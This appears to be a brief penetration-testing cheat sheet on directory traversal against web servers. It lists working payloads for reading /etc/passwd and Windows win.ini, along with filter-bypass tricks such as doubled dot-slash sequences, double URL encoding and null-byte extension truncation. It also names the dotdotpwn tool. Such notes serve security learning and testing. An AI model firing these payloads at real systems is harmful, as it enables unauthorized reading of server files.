Some files are used as input on web server, which can be manipulated to inject another file (`/etc/passwd`)

## Tool
- dotdotpwn

## Input examples
- ../../../etc/passwd
- ....//....//....//etc/passwd --> because ../ may be stripped
- ..%252f..%252fetc%252fpasswd --> to encode only `/`
- can also encore whole `../` once or twice
- some base folder may be mandatory, like /var/www/images so:
	- `/var/www/images/../../../etc/passwd` may be valid (with or without first slash)
- some application may require a filename ending with a file extension (`.png`), for this you can use the null byte to terminate the file path (`%00.<file-extension>`)
## Linux
On websites, images are usually stored in /var/www/images, so ../../.. is equivalent to root

## Windows
../../../windows/win.ini
Note that on windows, `/` and `\` are equivalent
